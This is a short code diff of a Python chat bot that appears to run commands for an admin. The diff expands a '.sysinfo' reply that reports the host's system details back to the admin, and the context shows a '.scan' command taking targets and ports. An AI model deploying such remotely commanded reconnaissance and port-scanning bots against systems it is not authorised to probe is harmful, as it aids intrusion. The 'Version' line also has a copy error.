@@ -373,14 +373,20 @@ def main():
                     
                 # Respond to '.sysinfo' command from admin.
                 if name.lower() == adminname.lower() and message.find('.sysinfo') != -1:
+                    # System
+                    sendmsg("System: " + format(platform.system()), adminname)
+                    # Node
+                    sendmsg("Node: " + format(platform.node()), adminname)
+                    # Release
+                    sendmsg("Release: " + format(platform.release()), adminname)
+                    # Version
+                    sendmsg("Version :" + format(platform.release()), adminname)
                     # Architecture
                     sendmsg("Architecture: " + format(platform.architecture()[0]), adminname)
-                    # machine
+                    # Machine
                     sendmsg("Machine: " + format(platform.machine()), adminname)
-                    # node
-                    sendmsg("Node: " + format(platform.node()), adminname)
-                    # system
-                    sendmsg("System: " + format(platform.system()), adminname)
+                    
+                    
                                 
                 # Respond to '.scan [target] [port(s)]' command from admin.
                 if name.lower() == adminname.lower() and message[:5].find('.scan') != -1:
